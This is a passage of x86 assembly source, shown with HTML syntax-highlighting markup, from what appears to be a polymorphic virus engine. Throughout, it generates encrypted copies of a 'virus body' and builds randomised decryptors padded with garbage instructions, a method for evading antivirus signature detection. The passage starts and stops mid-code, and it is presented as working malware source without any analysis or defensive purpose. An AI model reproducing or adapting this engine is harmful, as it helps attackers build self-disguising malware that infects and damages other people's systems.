                </span><span class="sc1">; Random code</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;As i already said "random code" may contain another CALLs</span><span class="sc0">
                </span><span class="sc1">;and JMPs</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">style_table</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">

</span><span class="sc5">do_call</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000003h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">is_not_loop</span><span class="sc0">

                </span><span class="sc1">;At this time the CALLs that loads the index and counter</span><span class="sc0">
                </span><span class="sc1">;registers have been generated</span><span class="sc0">
                </span><span class="sc1">;We need to save current position into decryptor code</span><span class="sc0">
                </span><span class="sc1">;in order to jump here on each decryptor iteration</span><span class="sc0">
                </span><span class="sc1">;I think is not a bad idea to also hide this point inside</span><span class="sc0">
                </span><span class="sc1">;blocks of random code</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">loop_point</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">is_not_loop</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">do_call</span><span class="sc0">

                </span><span class="sc1">;The hard work is done, now generate the end condition</span><span class="sc0">
                </span><span class="sc1">;and jumps</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_loop</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">

                </span><span class="sc1">;Some garbage</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_rnd_block</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SIZE_PADDING</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_fill</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc1">;Decryptor done, save its size</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">entry_point</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">decryptor_size</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc1">;Copy virus body to our buffer</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_base</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">mem_size</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Aply encryption over virus copy</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">scramble_virus</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_base</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">mem_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">inf_size</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fixed_size2ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">loop_hide_code</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">perform_crypt</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oper_size</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">loop_copy_res</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">loop_copy_res</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">loop_hide_code</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Perform encryption</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">perform_crypt</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;This buffer will contain the code to "crypt" the virus code</span><span class="sc0">
                </span><span class="sc1">;followed by a RET instruction</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate decryptor action: Get delta offset</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">gen_get_delta</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Lets generate polymorphic code for the following pseudocode:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">; CALL get_delta</span><span class="sc0">
                </span><span class="sc1">; Random data</span><span class="sc0">
                </span><span class="sc1">; get_delta:</span><span class="sc0">
                </span><span class="sc1">; Random code</span><span class="sc0">
                </span><span class="sc1">; POP reg</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Here come the CALL opcode</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

                </span><span class="sc1">;Let space for the address to call</span><span class="sc0">

                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">delta_call</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc1">;Generate some random data</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_rnd_block</span><span class="sc0">

                </span><span class="sc1">;Get displacement from CALL instruction to destination</span><span class="sc0">
                </span><span class="sc1">;address</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

                </span><span class="sc1">;Put destination address after CALL opcode</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">00000004h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;This code will be generated where the CALL points to</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">; Random code</span><span class="sc0">
                </span><span class="sc1">; POP index register</span><span class="sc0">
                </span><span class="sc1">; Random code</span><span class="sc0">
                </span><span class="sc1">; Fix index register value</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Note that "random code" can contain some PUSH and POP</span><span class="sc0">
                </span><span class="sc1">;instruction, so there is no equivalence betwen the</span><span class="sc0">
                </span><span class="sc1">;first POP after the CALL and the register used as index</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">

                </span><span class="sc1">;Make needed fixes to point index to start or end of</span><span class="sc0">
                </span><span class="sc1">;encrypted code</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">mem_size</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ptr_disp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">delta_call</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">build_flags</span><span class="sc4">],</span><span class="sc5">CRYPT_DIRECTION</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fix_dir_ok</span><span class="sc0">

                </span><span class="sc1">;Direction is from top to bottom</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fixed_size2ecx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oper_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">fix_dir_ok</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Fix using ADD or SUB?</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fix_with_sub</span><span class="sc0">

</span><span class="sc5">fix_with_add</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;Generate ADD reg_index,fix_value</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C081h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">fix_done</span><span class="sc0">

</span><span class="sc5">fix_with_sub</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;Generate SUB reg_index,-fix_value</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0E881h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">fix_done</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate decryptor action: Load counter</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">gen_load_ctr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;Easy now, just move counter random initial value</span><span class="sc0">
                </span><span class="sc1">;into counter reg and calculate the end value</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fixed_size2ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">build_flags</span><span class="sc4">],</span><span class="sc5">CRYPT_CDIR</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">counter_down</span><span class="sc0">
</span><span class="sc5">counter_up</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">done_ctr_dir</span><span class="sc0">
</span><span class="sc5">counter_down</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">done_ctr_dir</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">end_value</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate decryptor action: Decrypt</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">gen_decrypt</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;Check if we are going to use a displacement in the</span><span class="sc0">
                </span><span class="sc1">;indexing mode</span><span class="sc0">
                
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ptr_disp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">more_complex</span><span class="sc0">

                </span><span class="sc1">;Choose generator for [reg] indexing mode</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbl_idx_reg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">choose_magic</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">you_got_it</span><span class="sc0">

</span><span class="sc5">more_complex</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;More fun?!?!</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">build_flags</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">CRYPT_SIMPLEX</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">crypt_xtended</span><span class="sc0">

                </span><span class="sc1">;Choose generator for [reg+imm] indexing mode</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbl_dis_reg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">choose_magic</span><span class="sc0">

</span><span class="sc5">you_got_it</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;Use magic to convert some values into</span><span class="sc0">
                </span><span class="sc1">;desired instructions</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">size_correct</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">adn_reg_01</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">00000101b</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">adn_reg_02</span><span class="sc0">
</span><span class="sc5">adn_reg_01</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">common_part</span><span class="sc0">                
</span><span class="sc5">adn_reg_02</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">45h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">common_part</span><span class="sc0">

</span><span class="sc5">crypt_xtended</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Choose [reg+reg] or [reg+reg+disp]</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">CRYPT_COMPLEX</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ok_complex</span><span class="sc0">

                </span><span class="sc1">;Get random displacement from current displacement</span><span class="sc0">
                </span><span class="sc1">;eeehh?!?</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000010h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">disp2disp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">load_aux</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">

                </span><span class="sc1">;Choose generator for [reg+reg+imm] indexing mode</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbl_paranoia</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">choose_magic</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">done_xtended</span><span class="sc0">

</span><span class="sc5">ok_complex</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ptr_disp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">load_aux</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">

                </span><span class="sc1">;Choose generator for [reg+reg] indexing mode</span><span class="sc0">

